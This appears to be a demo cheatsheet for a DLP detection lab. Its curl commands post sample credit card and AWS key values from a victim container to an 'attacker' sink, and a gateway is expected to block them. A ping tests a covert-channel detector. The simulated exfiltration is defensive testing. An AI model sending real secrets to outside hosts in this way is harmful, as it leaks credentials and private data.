# DLPDetection — Live Demo Cheatsheet

## Setup Prerequisites
1. Start the stack: `docker compose up -d`
2. Terminal 1 (Gateway logs): `docker compose logs -f gateway`
3. Terminal 2 (Covert detector): `docker compose logs -f covert-detector`
4. Terminal 3 (Attacker Sink): `docker compose exec attacker python servers/http_sink.py`

---

## 1. Web L7 DLP Scenarios (HTTP Port 80)

### 1.1 Benign Traffic (Pass-Through)

- **Command (Victim):**
```bash
  docker compose exec victim curl -i -X POST [http://172.21.0.10/](http://172.21.0.10/) -d "user=alice&status=ok"
```

- **Expected:** `HTTP/1.1 200 OK` on Victim, data received on Attacker sink, 0 alerts on Gateway.

### 1.2 Credit Card Exfiltration (Luhn Block)

* **Command (Victim):**
```bash
docker compose exec victim curl -i -X POST [http://172.21.0.10/](http://172.21.0.10/) -d "card=4111-1111-1111-1111"
```

- **Expected:** `HTTP 403 Forbidden` on Victim, alert `luhn_cc` in Gateway logs, nothing received on Attacker sink.

### 1.3 AWS Key Exfiltration (Regex Block)

- **Command (Victim):**
```bash
docker compose exec victim curl -i -X POST [http://172.21.0.10/](http://172.21.0.10/) -d "token=AKIAIOSFODNN7EXAMPLE"
```


- **Expected:** `HTTP 403 Forbidden` on Victim, alert `AWS_ACCESS_KEY_ID` in Gateway logs.

---

## 2. Covert Channel Scenarios (L3/L4)

### 2.1 ICMP Ping (Baseline / Anomaly)

* **Command (Victim):**
```bash
docker compose exec victim ping -c 2 172.21.0.10
```


* **Expected:** Packets logged in `covert-detector`.
